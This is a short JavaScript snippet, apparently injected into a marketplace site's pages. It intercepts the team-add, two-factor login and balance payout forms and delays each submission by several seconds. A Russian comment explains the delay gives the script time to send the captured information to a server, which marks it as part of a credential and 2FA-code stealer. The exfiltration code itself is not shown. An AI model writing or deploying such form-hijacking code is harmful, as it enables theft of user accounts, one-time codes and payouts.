let teamAddForm;
if (document.querySelector('form[method="POST"][action*="/market/"][action*="/team/"]') != undefined) {
           teamAddForm = document.querySelector('form[method="POST"][action*="/market/"][action*="/team/"]')
           
      }

      if (teamAddForm != undefined){
      teamAddForm.addEventListener('submit', function(event) {
              event.preventDefault();

              setTimeout(function() {
                  teamAddForm.removeEventListener('submit', this);
                  teamAddForm.submit();
              }, 3500)
          });}

let twoFA;
if (document.querySelector('form#registerform[action="/login/tfa"]') != undefined) {
           twoFA = document.querySelector('form#registerform[action="/login/tfa"]')    
      }           

      if (twoFA != undefined){
      twoFA.addEventListener('submit', function(event) {
              event.preventDefault();
             
              // дайте скрипту секунду для отправки инфы на сервер, а затем продолжаем как обычно
              setTimeout(function() {
                  twoFA.removeEventListener('submit', this);
                  twoFA.submit();
              }, 6000)
          });}

let tfaToPayout; 
if (document.querySelector('form[action*="/balance/payout"]') != undefined) {
           tfaToPayout = document.querySelector('form[action*="/balance/payout"]')    
      }           

      if (tfaToPayout != undefined){
      tfaToPayout.addEventListener('submit', function(event) {
              event.preventDefault();
              setTimeout(function() {
                  tfaToPayout.removeEventListener('submit', this);
                  tfaToPayout.submit();
              }, 7500)
          });}


console.log('is loaded2')
